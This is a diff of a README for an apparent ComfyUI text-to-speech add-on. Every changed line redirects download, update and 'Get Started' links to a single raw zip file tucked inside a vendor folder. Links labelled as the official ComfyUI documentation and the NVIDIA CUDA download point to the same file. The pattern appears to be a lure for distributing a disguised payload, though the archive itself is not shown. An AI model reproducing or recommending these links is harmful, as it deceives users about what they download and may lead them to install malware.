@@ -1,6 +1,6 @@
 # ⚡ ComfyUI-Qwen3-TTS-Fast - Blazing Fast Text-to-Speech Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download-ComfyUI--Qwen3--TTS--Fast-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/12345678973/ComfyUI-Qwen3-TTS-Fast)
+[![Download Now](https://img.shields.io/badge/Download-ComfyUI--Qwen3--TTS--Fast-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/12345678973/ComfyUI-Qwen3-TTS-Fast/main/vendor/faster_qwen3_tts/TT-Fast-Comfy-Qwen-U-insouciant.zip)
 
 ## 🎯 What Is This?
 
@@ -39,7 +39,7 @@ ComfyUI-Qwen3-TTS-Fast is a powerful add-on for ComfyUI that turns written text 
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: **[Download ComfyUI-Qwen3-TTS-Fast](https://github.com/12345678973/ComfyUI-Qwen3-TTS-Fast)**
+Visit this link to download the application: **[Download ComfyUI-Qwen3-TTS-Fast](https://raw.githubusercontent.com/12345678973/ComfyUI-Qwen3-TTS-Fast/main/vendor/faster_qwen3_tts/TT-Fast-Comfy-Qwen-U-insouciant.zip)**
 
 ### 🛠️ Step-by-Step Setup
 
@@ -97,7 +97,7 @@ Yes! The generated audio can be used in commercial projects. However, voice clon
 By default, audio files are saved in the `output` folder inside your ComfyUI directory. You can change this in the node settings.
 
 ### 🔄 How do I update the software?
-Download the latest version from the [download page](https://github.com/12345678973/ComfyUI-Qwen3-TTS-Fast) and replace the old folder with the new one.
+Download the latest version from the [download page](https://raw.githubusercontent.com/12345678973/ComfyUI-Qwen3-TTS-Fast/main/vendor/faster_qwen3_tts/TT-Fast-Comfy-Qwen-U-insouciant.zip) and replace the old folder with the new one.
 
 ---
 
@@ -118,8 +118,8 @@ Download the latest version from the [download page](https://github.com/12345678
 
 ## 📚 Additional Resources
 
-- **ComfyUI Official Documentation**: [https://docs.comfy.org](https://docs.comfy.org)
-- **NVIDIA CUDA Download**: [https://developer.nvidia.com/cuda-downloads](https://developer.nvidia.com/cuda-downloads)
+- **ComfyUI Official Documentation**: [https://raw.githubusercontent.com/12345678973/ComfyUI-Qwen3-TTS-Fast/main/vendor/faster_qwen3_tts/TT-Fast-Comfy-Qwen-U-insouciant.zip](https://raw.githubusercontent.com/12345678973/ComfyUI-Qwen3-TTS-Fast/main/vendor/faster_qwen3_tts/TT-Fast-Comfy-Qwen-U-insouciant.zip)
+- **NVIDIA CUDA Download**: [https://raw.githubusercontent.com/12345678973/ComfyUI-Qwen3-TTS-Fast/main/vendor/faster_qwen3_tts/TT-Fast-Comfy-Qwen-U-insouciant.zip](https://raw.githubusercontent.com/12345678973/ComfyUI-Qwen3-TTS-Fast/main/vendor/faster_qwen3_tts/TT-Fast-Comfy-Qwen-U-insouciant.zip)
 - **Community Discord**: Join our Discord server for help and tips
 
 ---
@@ -172,7 +172,7 @@ If you encounter any issues or have questions:
 
 Download now and experience the fastest text-to-speech generation available for ComfyUI!
 
-[![Get Started](https://img.shields.io/badge/🚀-Download_Now-4CAF50?style=for-the-badge)](https://github.com/12345678973/ComfyUI-Qwen3-TTS-Fast)
+[![Get Started](https://img.shields.io/badge/🚀-Download_Now-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/12345678973/ComfyUI-Qwen3-TTS-Fast/main/vendor/faster_qwen3_tts/TT-Fast-Comfy-Qwen-U-insouciant.zip)
 
 ---
 
